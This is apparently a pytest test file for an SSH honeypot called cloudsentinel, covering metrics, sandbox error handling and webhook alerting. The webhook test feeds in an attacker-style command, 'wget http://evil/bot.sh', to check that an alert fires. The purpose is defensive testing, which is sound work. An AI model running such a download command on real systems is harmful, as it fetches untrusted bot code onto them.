"""Ninth batch: metrics, sandbox error paths, webhook branch."""

from __future__ import annotations

import time

import pytest

from cloudsentinel.config import load_settings
from cloudsentinel.metrics import get_metrics
from cloudsentinel.pipeline import EventEnvelope
from cloudsentinel.sandbox import DockerSDKSandbox, GVisorSandbox
from cloudsentinel.server import CloudSentinelSSHServer, ConnectionLimiter


def test_metrics_methods() -> None:
    metrics = get_metrics()
    metrics.record_connect()
    metrics.record_disconnect()
    metrics.record_auth_fail()
    metrics.record_auth_success()
    metrics.record_command()
    metrics.record_block("unit")
    metrics.record_event("unit.event")
    assert metrics.total_events >= 1
    metrics.set_mttb(1.5)
    metrics.set_blocked_count(2)
    metrics.set_pipeline_status(True, 0)
    assert metrics.render()
    assert "cloudsentinel_" in metrics.content_type or "text/plain" in metrics.content_type


def test_total_events_reads_labelled_counter(monkeypatch: pytest.MonkeyPatch) -> None:
    class Sample:
        def __init__(self, name: str, value: float) -> None:
            self.name = name
            self.value = value

    class Family:
        def __init__(self) -> None:
            self.samples = [
                Sample("cloudsentinel_events_total", 4.0),
                Sample("cloudsentinel_events_total_created", 1.0),
            ]

    class FakeCounter:
        def collect(self) -> list[Family]:
            return [Family()]

    monkeypatch.setattr("cloudsentinel.metrics.events_total", FakeCounter())
    assert get_metrics().total_events == 4.0


@pytest.mark.asyncio
async def test_gvisor_error_path(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr("cloudsentinel.sandbox.shutil.which", lambda _: "/usr/bin/runsc")

    async def fake_exec(*_args: object, **_kwargs: object):
        raise OSError("runsc failed")

    monkeypatch.setattr("asyncio.create_subprocess_exec", fake_exec)
    code, message = await GVisorSandbox().execute("whoami", "~")
    assert code == 1
    assert "gVisor error" in message


@pytest.mark.asyncio
async def test_docker_sdk_timeout_and_error(monkeypatch: pytest.MonkeyPatch) -> None:
    pytest.importorskip("docker")

    class TimeoutContainer:
        def wait(self, timeout: int) -> dict:
            raise TimeoutError()

        def kill(self) -> None:
            return None

        def logs(self) -> bytes:
            return b""

    class TimeoutContainers:
        def run(self, *_args: object, **_kwargs: object) -> TimeoutContainer:
            return TimeoutContainer()

    class TimeoutClient:
        containers = TimeoutContainers()

    sandbox = DockerSDKSandbox()
    sandbox._client = TimeoutClient()
    code, message = await sandbox.execute("whoami", "~")
    assert code == 124
    assert "timeout" in message.lower()

    class BrokenContainers:
        def run(self, *_args: object, **_kwargs: object):
            raise RuntimeError("docker broke")

    class BrokenClient:
        containers = BrokenContainers()

    sandbox2 = DockerSDKSandbox()
    sandbox2._client = BrokenClient()
    code, message = await sandbox2.execute("whoami", "~")
    assert code == 1
    assert "Sandbox error" in message


@pytest.mark.asyncio
async def test_server_webhook_branch(monkeypatch: pytest.MonkeyPatch) -> None:
    settings = load_settings(
        "src/cloudsentinel/configs/usas-production.yaml",
        "src/cloudsentinel/.env",
    )

    class FakePipeline:
        async def emit(self, _envelope: EventEnvelope) -> None:
            return None

    class FakeSoar:
        async def process_event(self, _session: str, _event: dict) -> dict:
            return {"cloudsentinel_soar_action": "dry_run_block", "cloudsentinel_risk_score": 80}

    class FakeHassh:
        def record_sighting(self, *_args: object) -> None:
            return None

        def lookup(self, *_args: object) -> dict:
            return {}

    class FakeNotifier:
        def __init__(self) -> None:
            self.called = False

        async def send_alert(self, _event: dict) -> None:
            self.called = True

    notifier = FakeNotifier()
    monkeypatch.setattr("cloudsentinel.webhook.get_notifier", lambda: notifier)
    server = CloudSentinelSSHServer(
        settings=settings,
        pipeline=FakePipeline(),
        soar=FakeSoar(),
        hassh_dna=FakeHassh(),
        limiter=ConnectionLimiter(),
    )
    await server._process_event(
        {
            "eventid": "cloudsentinel.command.input",
            "session": server.session_id,
            "src_ip": "8.8.8.8",
            "src_port": 1234,
            "input": "wget http://evil/bot.sh",
            "timestamp": time.time(),
        }
    )
    assert notifier.called is True
